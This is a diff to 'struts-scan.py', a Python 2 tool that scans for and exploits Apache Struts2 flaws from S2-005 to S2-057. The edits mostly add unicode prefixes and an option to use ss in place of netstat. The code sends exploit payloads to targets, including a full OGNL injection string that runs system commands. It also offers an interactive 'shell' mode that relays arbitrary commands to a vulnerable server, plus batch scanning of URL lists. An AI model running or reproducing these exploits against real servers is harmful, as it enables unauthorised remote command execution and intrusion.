@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# coding=utf-8
+# -*- coding: utf-8 -*-
 # code by Lucifer
 # Date 2017/10/22
 
@@ -77,23 +77,23 @@ class struts_baseverify:
                 }
 
     def check(self, pocname, vulnstr):
-        if vulnstr.find("Active Internet connections") is not -1:
-            cprint("目标存在" + pocname + "漏洞..[Linux]", "red")
+        if vulnstr.find("Active Internet connections") is not -1 or vulnstr.find("Netid") is not -1:
+            cprint(u"目标存在" + pocname + "漏洞..[Linux]", "red")
             filecontent.writelines(pocname+" success!!!"+"\n")
         elif vulnstr.find("Active Connections") is not -1:
-            cprint("目标存在" + pocname + "漏洞..[Windows]", "red")
+            cprint(u"目标存在" + pocname + "漏洞..[Windows]", "red")
             filecontent.writelines(pocname+" success!!!"+"\n")
         elif vulnstr.find("活动连接") is not -1:
-            cprint("目标存在" + pocname + "漏洞..[Windows]", "red")
+            cprint(u"目标存在" + pocname + "漏洞..[Windows]", "red")
             filecontent.writelines(pocname+" success!!!"+"\n")
         elif vulnstr.find("LISTEN") is not -1:
-            cprint("目标存在" + pocname + "漏洞..[未知OS]", "red")
+            cprint(u"目标存在" + pocname + "漏洞..[未知OS]", "red")
             filecontent.writelines(pocname+" success!!!"+"\n")
         else:
-            cprint("目标不存在" + pocname +"漏洞..", "green")
+            cprint(u"目标不存在" + pocname +"漏洞..", "green")
 
     def scan(self):
-        cprint('''
+        cprint(u'''
  ____  _              _            ____                  
 / ___|| |_ _ __ _   _| |_ ___     / ___|  ___ __ _ _ __  
 \___ \| __| '__| | | | __/ __|____\___ \ / __/ _` | '_ \ 
@@ -101,103 +101,103 @@ class struts_baseverify:
 |____/ \__|_|   \__,_|\__|___/    |____/ \___\__,_|_| |_|
                                         Code by Lucifer.
             ''', 'cyan')
-        cprint("-------检测struts2漏洞--------\n目标url:"+self.url, "cyan")
+        cprint(u"-------检测struts2漏洞--------\n目标url:"+self.url, "cyan")
         filecontent.writelines("检测struts2漏洞: "+self.url)
         filecontent.write("\n")
         try:
             req = requests.post(self.url, headers=headers, data=self.poc['ST2-005'], timeout=TMOUT, verify=False)
             self.check("struts2-005", req.text)
         except Exception as e:
-            cprint("检测struts2-005超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-005超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req = requests.get(self.url+self.poc['ST2-008-1'], headers=headers,  timeout=TMOUT, verify=False)
             self.check("struts2-008-1", req.text)
         except Exception as e:
-            cprint("检测struts2-008-1超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-008-1超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req = requests.get(self.url+self.poc['ST2-008-2'], headers=headers,  timeout=TMOUT, verify=False)
             self.check("struts2-008-2", req.text)
         except Exception as e:
-            cprint("检测struts2-008-2超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-008-2超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req = requests.post(self.url, headers=headers, data=self.poc['ST2-009'], timeout=TMOUT, verify=False)
             self.check("struts2-009", req.text)
         except Exception as e:
-            cprint("检测struts2-009超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-009超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req = requests.post(self.url, headers=headers, data=self.poc['ST2-013'], timeout=TMOUT, verify=False)
             self.check("struts2-013", req.text)
         except Exception as e:
-            cprint("检测struts2-013超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-013超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req = requests.post(self.url, headers=headers, data=self.poc['ST2-016'], timeout=TMOUT, verify=False)
             self.check("struts2-016", req.text)
         except Exception as e:
-            cprint("检测struts2-016超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-016超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req = requests.get(self.url+'/?redirect:https://www.baidu.com/%23', timeout=TMOUT, verify=False)
             if req.status_code == 302:
-                cprint("目标存在struts2-017漏洞..(只提供检测)", "red")
+                cprint(u"目标存在struts2-017漏洞..(只提供检测)", "red")
                 filecontent.writelines("struts2-017 success!!!\n")
             else:
-                cprint("目标不存在struts2-017漏洞..", "green")
+                cprint(u"目标不存在struts2-017漏洞..", "green")
         except Exception as e:
-            cprint("检测struts2-017超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-017超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req = requests.post(self.url, headers=headers, data=self.poc['ST2-019'], timeout=TMOUT, verify=False)
             self.check("struts2-019", req.text)
         except Exception as e:
-            cprint("检测struts2-019超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-019超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req = requests.get(self.url+self.poc['ST2-devmode'], headers=headers, timeout=TMOUT, verify=False)
             self.check("struts2-devmode", req.text)
         except Exception as e:
-            cprint("检测struts2-devmode超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-devmode超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req = requests.get(self.url+self.poc['ST2-032'], headers=headers, timeout=TMOUT, verify=False)
             self.check("struts2-032", req.text)
         except Exception as e:
-            cprint("检测struts2-032超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-032超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req = requests.get(self.url+self.poc['ST2-033'], headers=headers, timeout=TMOUT, verify=False)
             self.check("struts2-033", req.text)
         except Exception as e:
-            cprint("检测struts2-033超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-033超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req = requests.get(self.url+self.poc['ST2-037'], headers=headers, timeout=TMOUT, verify=False)
             self.check("struts2-037", req.text)
         except Exception as e:
-            cprint("检测struts2-037超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-037超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req = requests.get(self.url, headers=headers2, timeout=TMOUT, verify=False)
             self.check("struts2-045", req.text)
         except Exception as e:
-            cprint("检测struts2-045超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-045超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             headers045 = {
@@ -206,13 +206,13 @@ class struts_baseverify:
             req = requests.get(self.url, headers=headers045, timeout=TMOUT, verify=False)
             try:
                 if r"1522756" in req.headers['testvuln']:
-                    cprint("目标存在struts2-045-2漏洞..", "red")
+                    cprint(u"目标存在struts2-045-2漏洞..", "red")
                     filecontent.writelines("struts2-045-2 success!!!\n")
             except:
                 pass
         except Exception as e:
-            cprint("检测struts2-045-2超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-045-2超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             uploadexp = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -an').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x000"
@@ -220,8 +220,8 @@ class struts_baseverify:
             req = requests.post(self.url, files=files, timeout=TMOUT, verify=False)
             self.check("struts2-046", req.text)
         except Exception as e:
-            cprint("检测struts2-046超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-046超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             vulnurl = urlparse(self.url)[0] + "://" + urlparse(self.url)[1] + "/struts2-showcase/integration/saveGangster.action"
@@ -234,31 +234,31 @@ class struts_baseverify:
             req = requests.post(vulnurl, data=postdata, headers=headers, timeout=TMOUT, verify=False)
             self.check("struts2-048", req.text)
         except Exception as e:
-            cprint("检测struts2-048超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-048超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req1 = requests.get(self.url+"?class[%27classLoader%27][%27jarPath%27]=1", headers=headers, timeout=TMOUT, verify=False)
             req2 = requests.get(self.url+"?class[%27classLoader%27][%27resources%27]=1", headers=headers, timeout=TMOUT, verify=False)
             if req1.status_code == 200 and req2.status_code == 404:
-                cprint("目标存在struts2-020漏洞..(只提供检测)", "red")
+                cprint(u"目标存在struts2-020漏洞..(只提供检测)", "red")
                 filecontent.writelines("struts2-020 success!!!\n")
             else:
-                cprint("目标不存在struts2-020漏洞..", "green")
+                cprint(u"目标不存在struts2-020漏洞..", "green")
         except Exception as e:
-            cprint("检测struts2-020超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-020超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             req = requests.post(self.url, data=self.poc['ST2-052'], headers=headers_052, timeout=TMOUT, verify=False)
             if req.status_code == 500 and r"java.security.Provider$Service" in req.text:
-                cprint("目标存在struts2-052漏洞..(参考metasploit中的struts2_rest_xstream模块)", "red")
+                cprint(u"目标存在struts2-052漏洞..(参考metasploit中的struts2_rest_xstream模块)", "red")
                 filecontent.writelines("struts2-052 success!!!\n")
             else:
-                cprint("目标不存在struts2-052漏洞..", "green")
+                cprint(u"目标不存在struts2-052漏洞..", "green")
         except Exception as e:
-            cprint("检测struts2-052超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-052超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             params = [
@@ -271,12 +271,12 @@ class struts_baseverify:
             for param in params:
                 vulnurl = self.url + "?" + param + "=" + self.poc['ST2-053']
                 req = requests.get(vulnurl, headers=headers, timeout=TMOUT, verify=False)
-                tips = "检测struts2-053 post参数: " + param
+                tips = u"检测struts2-053 post参数: " + param
                 cprint(tips)
                 self.check("struts2-053", req.text)
         except Exception as e:
-            cprint("检测struts2-053超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-053超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             surl = self.url[self.url.rfind('/')::]
@@ -284,8 +284,8 @@ class struts_baseverify:
             req = requests.get(rurl, timeout=TMOUT, verify=False, allow_redirects=True)
             self.check("struts2-057-1", req.text)
         except Exception as e:
-            cprint("检测struts2-057-01超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-057-01超时..", "cyan")
+            print u"超时原因: ", e
 
         try:
             surl = self.url[self.url.rfind('/')::]
@@ -293,12 +293,12 @@ class struts_baseverify:
             req = requests.get(rurl, timeout=TMOUT, verify=False, allow_redirects=True)
             self.check("struts2-057-2", req.text)
         except Exception as e:
-            cprint("检测struts2-057-2超时..", "cyan")
-            print "超时原因: ", e
+            cprint(u"检测struts2-057-2超时..", "cyan")
+            print u"超时原因: ", e
 
 
     def inShell(self, pocname):
-        cprint('''
+        cprint(u'''
  ____  _              _            ____                  
 / ___|| |_ _ __ _   _| |_ ___     / ___|  ___ __ _ _ __  
 \___ \| __| '__| | | | __/ __|____\___ \ / __/ _` | '_ \ 
@@ -306,7 +306,7 @@ class struts_baseverify:
 |____/ \__|_|   \__,_|\__|___/    |____/ \___\__,_|_| |_|
                                         Code by Lucifer.
             ''', 'cyan')
-        cprint("-------struts2 交互式shell--------\n目标url:"+self.url, "cyan")
+        cprint(u"-------struts2 交互式shell--------\n目标url:"+self.url, "cyan")
         prompt = "shell >>"
 
         if pocname == "struts2-005":
@@ -320,7 +320,7 @@ class struts_baseverify:
                         req = requests.post(commurl, data=self.shell['struts2-005'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -335,7 +335,7 @@ class struts_baseverify:
                         req = requests.get(commurl+self.shell['struts2-008-1'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -350,7 +350,7 @@ class struts_baseverify:
                         req = requests.get(commurl+self.shell['struts2-008-2'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -365,7 +365,7 @@ class struts_baseverify:
                         req = requests.post(commurl, data=self.shell['struts2-009'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -380,7 +380,7 @@ class struts_baseverify:
                         req = requests.post(commurl, data=self.shell['struts2-013'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -395,7 +395,7 @@ class struts_baseverify:
                         req = requests.post(commurl, data=self.shell['struts2-016'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -410,7 +410,7 @@ class struts_baseverify:
                         req = requests.post(self.url, data=self.shell['struts2-019'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -425,7 +425,7 @@ class struts_baseverify:
                         req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -440,7 +440,7 @@ class struts_baseverify:
                         req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -455,7 +455,7 @@ class struts_baseverify:
                         req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -470,7 +470,7 @@ class struts_baseverify:
                         req = requests.get(commurl, headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -489,7 +489,7 @@ class struts_baseverify:
                         req = requests.get(self.url, headers=headers_exp, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -508,7 +508,7 @@ class struts_baseverify:
                         req = requests.get(self.url, headers=headers_exp, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -524,7 +524,7 @@ class struts_baseverify:
                         req = requests.post(self.url, files=files, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -545,7 +545,7 @@ class struts_baseverify:
                         req = requests.post(vulnurl, data=postdata, headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -565,7 +565,7 @@ class struts_baseverify:
                             print m.group(1).strip()
                         print "\n"
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -581,7 +581,7 @@ class struts_baseverify:
                         req = requests.get(rurl, headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
 
@@ -597,9 +597,17 @@ class struts_baseverify:
                         req = requests.get(rurl, headers=headers, timeout=TMOUT, verify=False)
                         print req.text
                     except:
-                        cprint("命令执行失败!!!", "red")
+                        cprint(u"命令执行失败!!!", "red")
                 else:
                     sys.exit(1)
+
+
+def replace_ss(dic):
+    result = {}
+    for key, value in dic.items():
+        result[key] = value.replace("netstat", "ss")
+    return result
+
 
 if __name__ == "__main__":
     filecontent = open("success.txt", "a+")
@@ -609,12 +617,16 @@ if __name__ == "__main__":
                 for line in f.readlines():
                     line = line.strip()
                     strutsVuln = struts_baseverify(line)
+                    if "-s" in sys.argv:
+                        strutsVuln.poc = replace_ss(strutsVuln.poc)
                     strutsVuln.scan()
         elif sys.argv[1] == "-u" and sys.argv[3] == "-i":
             strutsVuln = struts_baseverify(sys.argv[2].strip())
             strutsVuln.inShell(sys.argv[4].strip())
         else:
             strutsVuln = struts_baseverify(sys.argv[1].strip())
+            if "-s" in sys.argv:
+                strutsVuln.poc = strutsVuln.poc = replace_ss(strutsVuln.poc)
             strutsVuln.scan()
     except Exception as e:
         figlet = '''
@@ -626,6 +638,7 @@ if __name__ == "__main__":
                                         Code by Lucifer.
         '''
         cprint(figlet,'cyan')
-        print "Usage: python struts-scan.py http://example.com/index.action  检测"
-        print "       python struts-scan.py -u http://example.com/index.action -i struts2-045 进入指定漏洞交互式shell"
-        print "       python struts-scan.py -f url.txt  批量检测"
+        print u"Usage: python struts-scan.py http://example.com/index.action  检测"
+        print u"       python struts-scan.py -u http://example.com/index.action -i struts2-045 进入指定漏洞交互式shell"
+        print u"       python struts-scan.py -u http://example.com/index.action -s 使用ss命令探测（默认netstat）"
+        print u"       python struts-scan.py -f url.txt  批量检测"
